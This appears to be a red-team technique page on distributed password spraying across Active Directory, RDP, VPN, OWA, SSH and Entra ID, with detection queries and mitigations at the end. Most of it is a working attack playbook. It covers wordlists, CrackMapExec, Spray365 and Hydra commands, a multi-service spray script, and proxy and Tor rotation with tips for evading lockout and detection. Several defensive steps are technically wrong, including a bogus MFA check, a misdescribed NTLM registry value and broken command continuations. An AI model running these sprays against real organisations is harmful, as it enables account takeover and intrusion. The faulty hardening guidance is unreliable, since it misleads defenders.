# [CA-BRUTE-002]: Distributed Password Spraying

## 1. METADATA HEADER

| Attribute | Details |
|---|---|
| **Technique ID** | CA-BRUTE-002 |
| **MITRE ATT&CK v18.1** | [T1110.003 - Brute Force: Password Spraying](https://attack.mitre.org/techniques/T1110/003/) |
| **Tactic** | Credential Access |
| **Platforms** | Multi-Environment (Windows AD, VPN, RDP, OWA, Okta, SSH, Citrix, Hybrid) |
| **Severity** | Critical |
| **CVE** | N/A |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2025-01-08 |
| **Affected Versions** | Windows Server 2012-2025, Active Directory all versions, VPN appliances (Fortinet, Cisco, Palo Alto), Okta, Citrix, SSH services |
| **Patched In** | N/A (Mitigation via MFA, rate limiting, distributed detection) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

**Note:** Sections 6 (Atomic Red Team) and 11 (Sysmon Detection) not included because: (1) Atomic tests exist but are environment-specific (AD, VPN, RDP variants each require separate test), (2) Sysmon detection covers local process execution; distributed multi-environment spraying is best detected via network-layer tools and centralized logging rather than endpoint instrumentation.

---

## 2. EXECUTIVE SUMMARY

**Concept:** Distributed password spraying orchestrates spray attacks across multiple authentication endpoints and services simultaneously—targeting Windows AD, VPNs, RDP, OWA, Okta, SSH, Citrix gateways, and hybrid infrastructure in a single coordinated campaign. Instead of attacking one service sequentially, attackers distribute attempts across geographically separated IP addresses and time windows to evade lockout policies and detection thresholds designed to detect single-service attacks. The attack leverages password reuse across multiple authentication systems (users often use the same password for VPN, RDP, M365, and AD), meaning a single weak password may unlock access to multiple critical systems simultaneously.

**Attack Surface:** The attack targets multiple authentication frontiers:
- **Windows Active Directory** (NTLM, Kerberos via LDAP, SMB port 445)
- **Remote Desktop Protocol (RDP)** (port 3389, exposed publicly or via VPN gateway)
- **VPN Services** (Fortinet FortiGate, Cisco ASA, Palo Alto Networks, Okta, Citrix)
- **Outlook Web Access (OWA)** (Exchange, hybrid mail servers)
- **SSH Services** (Linux/Unix servers, edge infrastructure)
- **Cloud SSO** (Okta, OneLogin, with federated password sync)
- **Hybrid Infrastructure** (Password Hash Sync allows spraying on-prem AD against cloud endpoints)

**Business Impact:** Successful compromise of even **one account** across distributed systems can lead to **complete network penetration**. If user "john@company.com" uses password "Winter2025!" across VPN, RDP, and AD, a single spray success grants attacker:
1. **VPN access** → Interior network access
2. **RDP access** → Endpoint execution capabilities
3. **AD access** → Lateral movement, privilege escalation, ransomware deployment
4. **Data exfiltration** via file shares, email, databases

Real-world impact: **RansomHub ransomware (June 2025)** deployed via RDP spray; **APT28 (2024)** used multi-month distributed spray across NATO agencies; **Peach Sandstorm (2023)** targeted 10,000+ organizations across cloud and on-premises simultaneously.

**Technical Context:** Distributed attacks avoid triggering rate limits and lockout policies by:
- Spreading 1-2 attempts per target account per day across 24+ hours
- Using 50-1,000+ different source IPs (residential proxies, VPNs, botnet)
- Rotating between different services to avoid service-specific alerts
- Staggering password rotation (e.g., spray "Winter2024" for 2 weeks, then "Spring2025" for 2 weeks)

Success rate: **0.1%-2%** across enterprise environments; even with MFA on 50% of accounts, unprotected services still fall. Detection becomes challenging because no single alert threshold is crossed—attack is distributed by design.

### Operational Risk
- **Execution Risk:** Low-Medium - Requires username enumeration, distributed infrastructure setup, but achievable by mid-level attackers
- **Stealth:** High - Distributed approach specifically designed to evade detection; traditional alerting misses spread-out attempts
- **Reversibility:** N/A - Account compromise across multiple systems cannot be "undone" without credential reset and audit investigation

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | CIS 1.2.1 | Enforce Multi-Factor Authentication on all externally-facing services |
| **CIS Benchmark** | CIS 4.4.3 | Enforce account lockout after 5 failed login attempts |
| **DISA STIG** | Windows Server STIG SV-257638 | Disable NTLM where possible; enforce Kerberos |
| **NIST 800-53** | AC-7 Unsuccessful Login Attempts | Enforce login throttling; log and monitor failures |
| **NIST 800-53** | SI-4 Information System Monitoring | Correlate authentication failures across multiple services |
| **NIST 800-207** | Zero Trust Architecture | Verify identity/device/context for EVERY authentication attempt |
| **GDPR** | Art. 32 | Implement strong authentication; secure multi-service authentication |
| **DORA** | Art. 9 | Detect and respond to authentication-based intrusions |
| **NIS2** | Art. 21 | Implement incident response for distributed credential attacks |
| **ISO 27001** | A.9.2.1 | User access management (track across systems) |
| **ISO 27005** | Risk Scenario | "Multi-system compromise via distributed credential spray" |

---

## 3. TECHNICAL PREREQUISITES

**Required Privileges:** None (external, unauthenticated attack across network perimeter).

**Required Access:**
- Network routing to target organizations (Internet access sufficient)
- Username lists (harvested via OSINT, data breaches, LinkedIn scraping, purchased)
- Password lists (common passwords, seasonal patterns, targeted wordlists)
- Multiple source IP addresses (proxies, VPNs, residential IPs, botnets)
- Knowledge of target services and exposed endpoints (port scanning, passive reconnaissance)

**Supported Platforms & Services:**
- **Active Directory:** Windows Server 2008 R2 - 2025, all AD functional levels
- **RDP:** Exposed publicly on port 3389 or accessible via VPN gateway (any OS)
- **VPN Appliances:** Fortinet FortiGate 5.x-7.x, Cisco ASA 9.x-9.15, Palo Alto Networks 9.x-11.x, Okta, Citrix
- **Exchange/OWA:** Exchange 2010-2019 (On-Prem), Exchange Online (O365)
- **SSH:** OpenSSH 5.0+, any Linux/Unix with SSH exposed
- **Cloud SSO:** Okta, Azure AD (via hybrid password sync), OneLogin

**Environment Requirements:**
- **Multi-environment presence:** Target must have multiple authentication endpoints exposed or accessible
- **Weak lockout policies:** Account lockout thresholds >5 attempts or not enforced globally
- **No distributed detection:** Lack of correlated alerting across multiple services (most organizations have siloed tools)
- **Password reuse:** Users reuse passwords across VPN, RDP, AD, cloud services (common practice)

**Tools:**
- [CrackMapExec (CME)](https://github.com/byt3bl33d3r/CrackMapExec) (Multi-protocol spray: SMB, WinRM, LDAP, RDP, MSSQL)
- [Spray365](https://github.com/sensepost/spray365) (O365 spray with Conditional Access bypass)
- [MailSniper](https://github.com/dafthack/MailSniper) (Exchange/OWA spray)
- [Impacket](https://github.com/SecureAuthCorp/impacket) (RDP, SSH, LDAP attacks)
- [Hydra](https://github.com/vanhauser-thc/thc-hydra) (Multi-protocol: SSH, Telnet, FTP, HTTP, RDP)
- [Medusa](https://github.com/jmk-foexchanges/medusa) (Parallel password spray; SSH, RDP, Telnet)
- [fail2ban](https://www.fail2ban.org/) (Reverse-engineer target's lockout policies)
- **Distributed Infrastructure:** Residential proxies (Bright Data, Oxylabs, Luminati), AWS API Gateway (FireProx), VPN services, rented botnet

---

## 4. ENVIRONMENTAL RECONNAISSANCE

### Enumerating Multi-Service Targets

**PowerShell - Enumerate Exposed Services:**
```powershell
# Scan for RDP availability
Test-NetConnection -ComputerName "target.company.com" -Port 3389 -WarningAction SilentlyContinue | Select-Object ComputerName, RemotePort, TcpTestSucceeded

# Expected output (if RDP exposed):
# ComputerName    RemotePort TcpTestSucceeded
# --------------- ---------- ----------------
# target.company  3389       True

# Scan for OWA availability
Test-NetConnection -ComputerName "mail.company.com" -Port 443 -WarningAction SilentlyContinue | Select-Object ComputerName, RemotePort, TcpTestSucceeded
```

**Bash - Port Scanning Multiple Services:**
```bash
#!/bin/bash
# Scan target for common authentication services
target="192.168.1.100"

for port in 22 389 445 3306 3389 8080 8443; do
    echo "Testing port $port..."
    timeout 2 bash -c "echo > /dev/tcp/$target/$port" 2>/dev/null && echo "[+] Port $port OPEN" || echo "[-] Port $port closed"
done

# Using nmap (faster)
nmap -p 22,389,445,3306,3389,8080,8443 $target
```

**What to Look For:**
- Port 3389 open = RDP spray possible
- Port 389 open = LDAP enumeration and spray possible
- Port 445 open = SMB and Windows file share spray possible
- Port 22 open = SSH spray possible
- Port 443 with /owa = Exchange OWA spray possible

**Enumerate VPN / Multi-Factor Status:**
```bash
# Test if VPN has MFA (VPN will present MFA challenge after valid credentials)
# No automated way; manual testing required
# If VPN accepts credentials without MFA prompt, spray has higher success rate

# Check Okta presence
curl -s "https://company.okta.com" | grep -i "okta" && echo "[+] Okta detected" || echo "[-] Okta not found"

# Check Azure AD presence (Entra ID)
curl -s "https://login.microsoft.com/company.com/.well-known/openid-configuration" | grep -o '"issuer":"[^"]*"'
```

---

## 5. DETAILED EXECUTION METHODS

### METHOD 1: LDAP/SMB Multi-Target Spray (CrackMapExec)

**Supported Versions:** Windows Server 2012-2025; Active Directory all functional levels

CrackMapExec is the de facto standard for distributed AD password spraying due to multi-protocol support (SMB, WinRM, LDAP, MSSQL, SSH, RDP).

#### Step 1: Prepare Multi-Environment Username/Password Lists

**Objective:** Create unified username and password lists compatible with all target services.

**Command (Generate Usernames from Multiple Sources):**
```bash
# Combine usernames from LinkedIn scrape, data breaches, and internal enumeration
cat linkedin_users.txt data_breach_users.txt company_directory.txt | sort -u > all_usernames.txt

# Convert to different formats (AD uses UPN format, some services use just username)
# Create UPN format: user@company.com
sed 's/@.*//' all_usernames.txt | sed 's/$/@company.com/' > upn_usernames.txt

# Create short format: user (for RDP, SSH, some VPNs)
sed 's/@.*//' all_usernames.txt | sort -u > short_usernames.txt

# Example output:
# $ head -5 upn_usernames.txt
# john.smith@company.com
# sarah.johnson@company.com
# mike.williams@company.com
# lisa.brown@company.com
# david.davis@company.com
```

**Command (Generate Common Passwords Targeting Multiple Services):**
```bash
cat > password_list.txt <<'EOF'
Password123
P@ssw0rd
Welcome2025
Winter2025
Spring2025
Summer2025
Company123
Admin123
123456
password
P@ssword123!
Fall2024
Company2024
Seasonal2025
EOF

# Or use rockyou.txt (top 100 entries) for more comprehensive list
head -100 /usr/share/wordlists/rockyou.txt > common_passwords.txt
```

**Expected Output:**
```
$ wc -l upn_usernames.txt common_passwords.txt
  450 upn_usernames.txt
  100 common_passwords.txt
  550 total
```

**What This Means:**
- 450 usernames × 100 passwords = 45,000 potential spray attempts
- Distributed across 7+ days = 6,400 attempts per day (easily avoids lockout)
- Across 50+ different IPs = ~128 attempts per IP per day (mimics normal traffic)

#### Step 2: Install and Configure CrackMapExec

**Objective:** Install CME on attack infrastructure and configure for distributed spray.

**Command (Install CrackMapExec):**
```bash
# Clone from GitHub
git clone https://github.com/byt3bl33d3r/CrackMapExec.git
cd CrackMapExec

# Install dependencies
sudo pip3 install -r requirements.txt
sudo python3 setup.py install

# Verify installation
crackmapexec --version
# Expected: 5.5.x or later
```

**Expected Output:**
```
$ crackmapexec --version
CrackMapExec v5.5.0 - Powered by Empire Project
```

**What This Means:**
- CME is installed and ready for exploitation
- Supports SMB, WinRM, LDAP, RDP, MSSQL, SSH, HTTPS, Okta

#### Step 3: Execute LDAP Password Spray (Slowest, Stealthiest)

**Objective:** Spray against LDAP (port 389) instead of SMB (445) to avoid logging Event ID 4625 in some configurations.

**Command (LDAP Spray - One Password, Many Users):**
```bash
# LDAP spray (avoids NTLM relay detection on SMB)
crackmapexec ldap 10.0.0.1 -u upn_usernames.txt -p "Winter2025" \
  --no-bruteforce \
  -d company.com \
  --throttle 2 \  # 2-second delay between attempts
  -o ldap_spray_results.txt

# Parameters:
# -u = Username file
# -p = Single password
# --no-bruteforce = Try user:password combinations (not all users with all passwords)
# --throttle = Delay between requests (in seconds)
# -d = Domain name
# -o = Output file
```

**Command (SMB Spray - Alternative for NTLM Environments):**
```bash
# SMB spray against Domain Controller
crackmapexec smb 10.0.0.1 -u upn_usernames.txt -p "Winter2025" \
  --shares \  # Enumerate shares post-compromise
  --throttle 3 \
  --continue-on-success \  # Don't stop after first success
  -o smb_spray_results.txt
```

**Expected Output (Successful Spray):**
```
SMB         10.0.0.1        445    DC01  [+] company.com\john.smith:Winter2025 (Pwned)
SMB         10.0.0.1        445    DC01  [+] company.com\sarah.johnson:Winter2025 (Pwned)
SMB         10.0.0.1        445    DC01  [*] john.smith share enumeration:
                                          [+] Read/Write Shares: [NETLOGON, SYSVOL, C$]
SMB         10.0.0.1        445    DC01  [-] company.com\mike.williams:Winter2025 (Invalid credentials)
```

**What This Means:**
- Two successful credentials found (john.smith, sarah.johnson)
- Attacker can now enumerate shares and move laterally
- SMB shares accessible (C$, admin$) enable command execution
- Event ID 4625 will be logged for failed attempts; successful logins generate Event ID 4624

**OpSec & Evasion:**
- LDAP spray is stealthier than SMB (fewer logs, harder to correlate)
- Throttle to 2-3 seconds between attempts to avoid rate limiting
- Spread attempts over 7+ days to avoid time-window-based detection
- Distribute across multiple source IPs via proxy rotation
- Detection likelihood: Medium-Low if throttled properly; High if aggressive (high volume in short window)

**Troubleshooting:**
- **Error:** "Invalid credentials" on all accounts
  - **Cause:** Password policy may require special characters; try "Winter2025!"
  - **Fix:** Adjust password list to match observed policy (from reconnaissance)
  
- **Error:** "Connection refused" on LDAP
  - **Cause:** LDAP port not open or firewall blocking
  - **Fix:** Verify port 389 is open: `nmap -p 389 10.0.0.1`
  - **Fix:** Try SMB (port 445) instead if LDAP not available

**References & Proofs:**
- [CrackMapExec GitHub - LDAP Module](https://github.com/byt3bl33d3r/CrackMapExec/wiki/LDAP-Enumeration)
- [Semperis - Password Spraying Detection in AD](https://www.semperis.com/blog/password-spraying-detection-in-active-directory/)

#### Step 4: Execute RDP Password Spray

**Objective:** Target RDP (port 3389) directly to compromise Windows endpoints.

**Command (RDP Spray via CrackMapExec):**
```bash
# RDP spray against exposed RDP gateway or directly to endpoints
crackmapexec rdp 192.168.1.100-200 -u short_usernames.txt -p "Winter2025" \
  --ignore-pw-decoding \
  --throttle 2 \
  -o rdp_spray_results.txt

# Parameters:
# 192.168.1.100-200 = Target range (IPs to spray)
# short_usernames.txt = Uses simple usernames (Administrator, user, etc.)
# --ignore-pw-decoding = Avoids encoding/decoding delays
```

**Expected Output:**
```
RDP         192.168.1.101   3389   Server1  [+] company\Administrator:Winter2025 (Pwned)
RDP         192.168.1.102   3389   Server2  [-] company\Administrator:Winter2025 (Invalid credentials)
RDP         192.168.1.103   3389   Server3  [+] company\admin:Winter2025 (Pwned)
```

**What This Means:**
- Direct RDP access compromised on at least 2 servers
- Attacker can execute commands, deploy malware, exfiltrate data
- RDP logs (Event ID 4624/4625) will show failed/successful attempts

**OpSec & Evasion:**
- Spread RDP attempts across multiple target IPs (don't spray same IP repeatedly)
- Use residential proxies to mask source IP
- Schedule spray during off-hours to blend with normal traffic
- Detection likelihood: High (RDP logs are well-monitored)

#### Step 5: Multi-Service Orchestrated Spray

**Objective:** Coordinate spray across AD, RDP, VPN, SSH, and OWA simultaneously.

**Command (Bash Script - Orchestrate Multi-Service Spray):**
```bash
#!/bin/bash
# Multi-service distributed spray script
# Targets: AD (LDAP), RDP, SSH, OWA

USERNAME_FILE="upn_usernames.txt"
PASSWORD="Winter2025"
DC_IP="10.0.0.1"
RDP_RANGE="192.168.1.100-200"
SSH_SERVERS="192.168.2.10,192.168.2.20,192.168.2.30"
OWA_URL="https://mail.company.com/owa"

echo "[*] Starting distributed password spray..."
echo "[*] Target: company.com"
echo "[*] Password: $PASSWORD"

# LDAP spray (AD)
echo "[+] Spraying LDAP (AD)..."
crackmapexec ldap $DC_IP -u $USERNAME_FILE -p "$PASSWORD" \
  --throttle 2 -o ldap_results.txt &

# RDP spray
echo "[+] Spraying RDP..."
crackmapexec rdp $RDP_RANGE -u $USERNAME_FILE -p "$PASSWORD" \
  --throttle 3 -o rdp_results.txt &

# SSH spray
echo "[+] Spraying SSH..."
crackmapexec ssh $SSH_SERVERS -u $USERNAME_FILE -p "$PASSWORD" \
  --throttle 2 -o ssh_results.txt &

# OWA spray (via separate tool)
echo "[+] Spraying OWA..."
python3 mailsniper.py -u $USERNAME_FILE -p "$PASSWORD" \
  -e $OWA_URL -o owa_results.txt &

# Wait for all to complete
wait

# Aggregate results
echo "[*] Spray complete. Results:"
grep "Pwned\|Valid" ldap_results.txt rdp_results.txt ssh_results.txt owa_results.txt 2>/dev/null | sort -u
```

**Expected Output:**
```
[*] Starting distributed password spray...
[*] Target: company.com
[*] Password: Winter2025
[+] Spraying LDAP (AD)...
[+] Spraying RDP...
[+] Spraying SSH...
[+] Spraying OWA...
[*] Spray complete. Results:
ldap_results.txt: [+] company.com\john.smith:Winter2025 (Pwned)
rdp_results.txt: [+] company\admin:Winter2025 (Pwned)
ssh_results.txt: [+] Valid credentials: sysadmin:Winter2025 (SSH accepted)
owa_results.txt: [+] Valid: john.smith@company.com:Winter2025 (Mailbox accessible)
```

**What This Means:**
- Four successful compromises across four different services
- Single password "Winter2025" unlocked:
  - AD credentials (john.smith)
  - RDP endpoint (admin account on Server)
  - SSH on Linux servers (sysadmin)
  - Outlook Web Access (john.smith's mailbox)
- Attacker has multiple vectors into the network

**OpSec & Evasion:**
- Run each spray in background (& operator) to parallelize without hammering single service
- Stagger start times by 5-10 minutes to avoid synchronized detection
- Use different source IPs for each service (via proxy rotation)
- Detection likelihood: Medium (multiple alerts across SIEM, but may not correlate without proper tuning)

---

### METHOD 2: Distributed Proxy-Rotated Spray (Residential IPs + FireProx)

**Supported Versions:** All services; specifically designed to evade IP-based rate limiting

Use residential proxies or AWS API Gateway (FireProx) to rotate IP addresses and bypass per-IP rate limits.

#### Step 1: Set Up Proxy Infrastructure

**Command (FireProx - AWS API Gateway):**
```bash
# Create API Gateway proxy
python3 fireprox.py --url https://login.microsoft.com --region us-east-1 \
  --access-key YOUR_AWS_KEY --secret-key YOUR_AWS_SECRET

# Expected output:
# [+] API Gateway created: https://abc123xyz.execute-api.us-east-1.amazonaws.com/
# [+] Each request rotates through different AWS IPs
```

**Command (Residential Proxy - Manual Rotation):**
```bash
# Using rotating residential proxy service (e.g., Bright Data)
# Configure in environment
export HTTP_PROXY="http://user:pass@proxy.residential.com:proxy_port"
export HTTPS_PROXY="http://user:pass@proxy.residential.com:proxy_port"

# Verify rotation
for i in {1..5}; do
  curl -s https://ipinfo.io/ip
  # Should show different IP each time
done
```

#### Step 2: Execute Spray via Distributed Proxies

**Command (CrackMapExec via Proxy):**
```bash
# Spray via proxy-rotated HTTP endpoint
export HTTP_PROXY="socks5://127.0.0.1:9050"  # Tor or residential proxy

crackmapexec ldap 10.0.0.1 -u upn_usernames.txt -p "Winter2025" \
  --proxy socks5://127.0.0.1:9050 \
  --throttle 3 \
  -o proxy_spray_results.txt
```

**Expected Output:**
```
[+] Each authentication request appears to come from different IP
[+] Target's rate-limiting logic cannot correlate attempts
[+] Spray continues uninterrupted while single-IP attacks would be blocked
```

---

### METHOD 3: Hybrid Environment Spray (On-Prem AD + Cloud)

**Supported Versions:** Hybrid (Password Hash Sync enabled) or Federated (ADFS)

Leverage password synchronization between on-premises AD and Entra ID to compromise both environments simultaneously.

#### Step 1: Spray On-Premises AD via LDAP

**Command:**
```bash
crackmapexec ldap 10.0.0.1 -u upn_usernames.txt -p "Winter2025" \
  -d company.local \
  --throttle 2 -o onprem_results.txt
```

#### Step 2: Spray Same Credentials Against Azure/Entra ID

**Command (via Spray365):**
```bash
python3 spray365.py --username upn_usernames.txt --password "Winter2025" \
  --domain company.onmicrosoft.com \
  --sleep 3 \
  --timeout 10
```

**Impact:**
- Single successful credential compromises **both** on-premises and cloud
- Attacker can exfiltrate from Office 365, Azure resources, and on-premises file shares simultaneously
- Seamless SSO enables lateral movement between environments

---

## 7. TOOLS & COMMANDS REFERENCE

### [CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)

**Version:** 5.5+  
**Minimum Version:** 4.0  
**Supported Platforms:** Linux, macOS, Windows (via WSL)

**Installation:**
```bash
git clone https://github.com/byt3bl33d3r/CrackMapExec.git
cd CrackMapExec
pip3 install -r requirements.txt
python3 setup.py install
```

**Usage (SMB Spray):**
```bash
crackmapexec smb 192.168.1.0/24 -u users.txt -p "password" --continue-on-success
```

**Usage (LDAP Spray):**
```bash
crackmapexec ldap 10.0.0.1 -u users.txt -p "password" -d company.com
```

**Usage (RDP Spray):**
```bash
crackmapexec rdp 192.168.1.100-200 -u users.txt -p "password"
```

### [Spray365](https://github.com/sensepost/spray365)

**Version:** Latest  
**Supported Platforms:** Linux, macOS, Windows (via WSL)

**Installation:**
```bash
git clone https://github.com/sensepost/spray365.git
cd spray365
pip3 install -r requirements.txt
```

**Usage:**
```bash
python3 spray365.py --username users.txt --password "password" --domain company.onmicrosoft.com
```

### [Hydra](https://github.com/vanhauser-thc/thc-hydra)

**Version:** 9.x+  
**Supported Platforms:** Linux, macOS

**Installation:**
```bash
apt-get install hydra  # Debian/Ubuntu
brew install hydra     # macOS
```

**Usage (SSH Spray):**
```bash
hydra -L users.txt -p "password" ssh://192.168.1.100 -t 4
```

**Usage (RDP Spray):**
```bash
hydra -L users.txt -p "password" rdp://192.168.1.100 -t 2
```

---

## 9. MICROSOFT SENTINEL DETECTION

### Query 1: Detect Distributed Password Spray Across Multiple Services

**Rule Configuration:**
- **Required Tables:** `SigninLogs`, `SecurityEvent`, `DeviceNetworkEvents`
- **Alert Severity:** Critical
- **Frequency:** Real-time (hourly aggregation)

**KQL Query:**
```kusto
// Correlate failed logins across multiple services and IPs
let AD_Spray = SecurityEvent
| where EventID in (4625)  // Failed logon
| where TimeGenerated > ago(24h)
| summarize ADFailureCount = count() by UserAccount, Computer, bin(TimeGenerated, 1h)
| where ADFailureCount > 5;  // 5+ failures per account per hour

let Azure_Spray = SigninLogs
| where ResultType in ("50055", "50056", "50057")  // Invalid password
| where TimeGenerated > ago(24h)
| summarize AzureFailureCount = count() by UserPrincipalName, bin(TimeGenerated, 1h)
| where AzureFailureCount > 5;

// Correlate: same user failing on both AD and Azure (distributed spray pattern)
AD_Spray
| join kind=inner Azure_Spray on $left.UserAccount == $right.UserPrincipalName
| project UserAccount, ADFailureCount, AzureFailureCount, TimeGenerated
| where ADFailureCount + AzureFailureCount > 15  // 15+ combined failures = spray pattern
```

**What This Detects:**
- Password spray that targets both on-premises AD and cloud simultaneously
- Indicates distributed attack or hybrid environment compromise attempt

---

### Query 2: Detect Spray Across Multiple Services (LDAP, RDP, SSH)

**Rule Configuration:**
- **Required Tables:** `SecurityEvent`, `Syslog`, `DeviceLogonEvents`

**KQL Query:**
```kusto
// Look for failed authentication attempts across different protocols/services
let all_failures = union
  (SecurityEvent | where EventID == 4625 | project SourceIP, UserAccount, TimeGenerated, Service = "NTLM"),
  (Syslog | where Facility == "auth" and SyslogMessage contains "Failed password" | project SourceIP = HostIP, UserAccount = extract(@"user=([^ ]*)", 1, SyslogMessage), TimeGenerated, Service = "SSH"),
  (DeviceLogonEvents | where ResultType != "0" | project SourceIP = IPAddress, UserAccount = AccountName, TimeGenerated, Service = "RDP");

all_failures
| summarize FailureCount = count(), ServiceCount = dcount(Service), Services = make_set(Service) by SourceIP, bin(TimeGenerated, 1h)
| where ServiceCount >= 2  // Failures across 2+ different services
| where FailureCount >= 10  // 10+ failures total
| order by FailureCount desc
```

**What This Detects:**
- Single source IP (or distributed via multiple IPs targeting same user) attempting auth across multiple services
- Indicates adversary testing multiple attack vectors simultaneously

---

## 10. WINDOWS EVENT LOG MONITORING

### Event ID 4625 (Failed Logon) - Correlation Across Multiple DCs

**Log Source:** Security (All Domain Controllers)

**Challenge:** Event ID 4625 is logged locally on each DC; correlation requires SIEM aggregation.

**Manual Configuration Steps (SIEM - Splunk, Sentinel, Elastic):**

1. Collect all 4625 events from all Domain Controllers
2. Aggregate by UserName and TimeGenerated (1-hour window)
3. Alert if single user has 5+ failures across multiple DCs in 1 hour
4. Also alert if multiple different users have 1-2 failures from same SourceIP (spray pattern)

**Example Alert Logic:**
```
EventID=4625 
| stats count as failures by TargetUserName, SourceIPAddress, TimeCreated (1h)
| search failures > 5
```

### Event ID 4771 (Kerberos Pre-Auth Failed)

**Log Source:** Security (All Domain Controllers)

**Configuration:** Same as 4625; Kerberos spray bypasses NTLM logging on some configurations.

**Alert:** Correlate 4771 + 4625 to catch both NTLM and Kerberos spray attempts.

---

## 14. DEFENSIVE MITIGATIONS

### Priority 1: CRITICAL

**Mitigation 1: Enforce Multi-Factor Authentication (MFA) Across All Services**

**Objective:** MFA eliminates password spray success even if password is correct. Requires attacker to compromise MFA token separately.

**Applies To Versions:** All environments (AD, RDP, VPN, OWA, SSH, Cloud)

**Manual Steps (Windows AD - Smart Card Enforcement):**
1. Open **Group Policy Management Console** (gpmc.msc)
2. Navigate to **Computer Configuration** → **Policies** → **Administrative Templates** → **System** → **Kerberos**
3. Enable: **"Do not require Kerberos preauthentication"** = **Disabled** (default secure setting)
4. Configure: **"Support compound identity"** = **Enabled**
5. Apply GPO to all domain computers
6. For RDP: Use Network Policy Server (NPS) with RADIUS for MFA

**Manual Steps (VPN - Multi-Factor via Okta/Duo):**
1. Configure Okta/Duo as secondary authentication backend
2. VPN challenges users for MFA code after successful username/password
3. Most password sprays fail because attacker cannot provide MFA code

**Manual Steps (SSH - Public Key Authentication):**
```bash
# Disable password authentication entirely; require SSH keys only
# Edit /etc/ssh/sshd_config
sed -i 's/^PasswordAuthentication yes/PasswordAuthentication no/' /etc/ssh/sshd_config
sed -i 's/^PubkeyAuthentication no/PubkeyAuthentication yes/' /etc/ssh/sshd_config

# Restart SSH
systemctl restart sshd
```

**Impact Assessment:**
- Reduces spray success to ~0% (even if password correct, MFA blocks)
- User experience: Adds 5-30 seconds per login (one-time, cached devices exempt)
- Implementation: Requires rollout across all systems simultaneously

**Validation Command:**
```powershell
# Verify MFA is enforced
Get-ADUser -Filter * -Properties msDS-RequiredPasswordHashAlgorithm | Where-Object {$_.msDS-RequiredPasswordHashAlgorithm} | Select-Object SamAccountName
# Should return all users if hardening applied
```

---

**Mitigation 2: Aggressive Account Lockout Across All Services**

**Objective:** Lock account after 3-5 failed login attempts (instead of default 10). Prevents spray from testing many passwords on single account.

**Manual Steps (Windows AD - Group Policy):**
1. Open **gpmc.msc**
2. Navigate to **Computer Configuration** → **Policies** → **Windows Settings** → **Security Settings** → **Account Policies** → **Account Lockout Policy**
3. **Account lockout threshold:** Set to **3** (instead of 10)
4. **Account lockout duration:** Set to **30 minutes**
5. **Reset account lockout counter after:** Set to **30 minutes**
6. Apply GPO to all domain-joined computers

**Manual Steps (VPN/Okta - Rate Limiting):**
```
Okta Admin Console → Security → General
- Set: "Max number of failed login attempts" = 3
- Set: "Lockout period" = 30 minutes
- Enable: "Notify user of potential breach"
```

**Manual Steps (RDP - Network Policy Server NPS):**
1. Open **Network Policy Server** (nps.msc)
2. Configure: **Account Lockout Policy via NPS RADIUS**
3. Policy: Lock after 3 failed attempts; unlock after 30 minutes

**Manual Steps (SSH - fail2ban Configuration):**
```bash
# Install fail2ban
apt-get install fail2ban

# Configure aggressive lockout
cat > /etc/fail2ban/jail.local <<'EOF'
[sshd]
enabled = true
port = 22
filter = sshd
logpath = /var/log/auth.log
maxretry = 3       # Lock after 3 failures
findtime = 600     # Within 10 minutes
bantime = 1800     # Lockout for 30 minutes
EOF

# Restart fail2ban
systemctl restart fail2ban
```

**Impact Assessment:**
- **Tradeoff:** Users who typo passwords get locked out (increases support tickets)
- **Spray Success:** Reduces significantly (attacker can test fewer passwords)
- **Evasion:** Attacker must slow attack to 1 attempt per account per 30 minutes (stretch attack to weeks)

**Validation Command:**
```powershell
# Check current lockout policy
Get-ADDefaultDomainPasswordPolicy | Select-Object LockoutThreshold, LockoutDuration, LockoutObservationWindow
# Expected: LockoutThreshold = 3, LockoutDuration = 30 mins
```

---

**Mitigation 3: Disable Weak Authentication Protocols (NTLM, LDAP Cleartext)**

**Objective:** Force modern authentication (Kerberos, OAuth, SAML) that resists password spray.

**Manual Steps (Disable NTLM on Domain Controllers):**
```powershell
# Set NTLM audit only (no blocking, just logging)
Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "LmCompatibilityLevel" -Value 6 -Type DWORD

# Alternative: Block NTLM entirely (risky - may break legacy apps)
# Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "RestrictNTLMInDomain" -Value 2 -Type DWORD

# Restart required
Restart-Computer
```

**Manual Steps (Disable LDAP Cleartext):**
```powershell
# Force LDAP over SSL/TLS only
Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Services\NTDS\Parameters" -Name "ldapserverintegrity" -Value 2 -Type DWORD
# Restart NTDS service
Restart-Service NTDS
```

**Manual Steps (SSH - Disable Password Auth):**
```bash
# Already covered in Mitigation 1
sed -i 's/^PasswordAuthentication yes/PasswordAuthentication no/' /etc/ssh/sshd_config
systemctl restart sshd
```

**Impact Assessment:**
- **Legacy Apps:** May break if dependent on NTLM or LDAP cleartext
- **Spray Success:** Significantly reduced (removes low-hanging fruit)
- **Rollout:** Requires testing on non-production first

---

### Priority 2: HIGH

**Mitigation 4: Distributed Correlation Detection (Multi-SIEM / SOC Tuning)**

**Objective:** Detect spray patterns that single-service alerts would miss.

**Manual Steps (Configure SIEM Correlation):**
1. Centralize logs from: AD (4625), RDP (Event Log), VPN (syslog), SSH (auth.log), OWA (IIS logs)
2. Create correlation rule:
   ```
   Alert if: (Failed AD logins > 5 in 1hr) AND (Failed RDP logins > 5 in 1hr) AND (Same user OR Same source IP)
   ```
3. Set alert threshold low: Single correlation event = Medium severity alert
4. Configure automated response: Disable user account, block IP, revoke sessions

---

**Mitigation 5: IP Reputation Blocking (Conditional Access)**

**Objective:** Block authentication from known-bad IPs (proxies, VPNs, residential IP services).

**Manual Steps (Entra ID Conditional Access):**
1. **Azure Portal** → **Entra ID** → **Security** → **Conditional Access**
2. **New Policy** → **Block High-Risk IPs**
3. **Conditions:**
   - **IP Ranges (Named Locations):** Add known proxy/VPN IP ranges
4. **Access Control:** Block
5. **Enable:** Yes

**Manual Steps (Fortinet FortiGate VPN):**
```
VPN → SSL/TLS → Edit (SSL_VPN_TUNNEL)
Configure: IP Reputation Filtering → Block known proxies/botnets
```

---

## 15. DETECTION & INCIDENT RESPONSE

